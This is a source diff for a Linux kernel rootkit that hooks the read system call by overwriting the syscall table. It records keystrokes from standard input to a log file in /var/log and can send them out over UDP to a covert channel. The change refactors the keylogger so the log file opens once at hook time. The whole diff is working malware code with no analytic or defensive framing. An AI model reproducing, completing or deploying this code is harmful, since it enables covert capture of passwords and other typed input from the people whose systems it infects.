@@ -18,6 +18,9 @@
 
 asmlinkage long (*original_read) (unsigned int fd, char __user *buf, size_t count);
 
+/* fd for the log file */
+static struct file *fd;
+
 /*
  * call counter to ensure that we are not unhooking the
  * read syste call while it is still in use
@@ -29,31 +32,16 @@ static loff_t foffset = 0;
 
 extern int send_flag; // For network keylogging
 
-/* Function used for local logging inside /var/log */
-void write_to_file(char *buf)
+/*
+ * Function used for local logging inside /var/log
+ */
+void
+write_to_file(char *buf, long len)
 {
-        struct file *fd;
-        mm_segment_t oldfs;
-        int ret;
-        int size;
-
-	/* Create the file with Write and append mode */
-        fd = filp_open("/var/log/rootkit_log.log", O_CREAT|O_WRONLY|O_APPEND, S_IRWXU);
-
-        if (!IS_ERR (fd)) {
-                oldfs = get_fs();
-                set_fs(get_ds());
-
-                size = strlen(buf);
-
-                ret = vfs_write(fd, buf, size, &foffset); 
-                foffset += 1;
-                //do_sync_write(fd, buffer, readed, 0);
-
-                set_fs(oldfs);
-                filp_close(fd, NULL);
-        }
-	
+	if (!IS_ERR (fd)) {
+		vfs_write(fd, buf, len, &foffset); 
+		foffset += len;
+	}	
 }
 
 /*
@@ -63,29 +51,33 @@ void write_to_file(char *buf)
 asmlinkage long
 manipulated_read (unsigned int fd, char __user *buf, size_t count)
 {
+	/* increase our call counter */
 	INCREASE_CALL_COUNTER(read_call_counter, &read_lock, read_lock_flags);
 	
 	int i;	
 	long ret = original_read(fd, buf, count);
 
-	if(ret >= 1 && fd == 0)
-	{
+	if(ret >= 1 && fd == 0) {
+		/* keylog to local file */
+		write_to_file(buf, ret);
+		
 		for(i = 0; i < ret; i++) {
 			char sendbuf[2];
+			
 			memcpy(sendbuf, buf+i, 1);
 			memset(sendbuf+1, '\0', 1);
+			
 			/* If the send_flag is set, then network keylogging is enabled */
-			if(send_flag)
-			{
+			if(send_flag) {
 				send_udp(sendbuf);
 			}
 			
-			write_to_file(sendbuf);
 			/* send to covert communication channel */
 			accept_input(buf[i]);
 		}
 	}
 
+	/* decrease our call counter and return */
 	DECREASE_CALL_COUNTER(read_call_counter, &read_lock, read_lock_flags);
 	return ret;
 }
@@ -99,6 +91,9 @@ hook_read(void)
 	ROOTKIT_DEBUG("Hooking read syscall...\n");
 
 	void **sys_call_table = (void *) sysmap_sys_call_table;
+	
+	/* create the file with write and append mode */
+	fd = filp_open("/var/log/rootkit_log.log", O_CREAT|O_WRONLY|O_APPEND, S_IRWXU);
 	
 	/* disable write protection */
 	disable_page_protection();
@@ -138,6 +133,9 @@ unhook_read(void)
 	while(read_call_counter > 0) {
 		msleep(2);
 	}
+	
+	/* close our logfile */
+	filp_close(fd, NULL);
 
 	/* log and return */	
 	ROOTKIT_DEBUG("Done.\n");
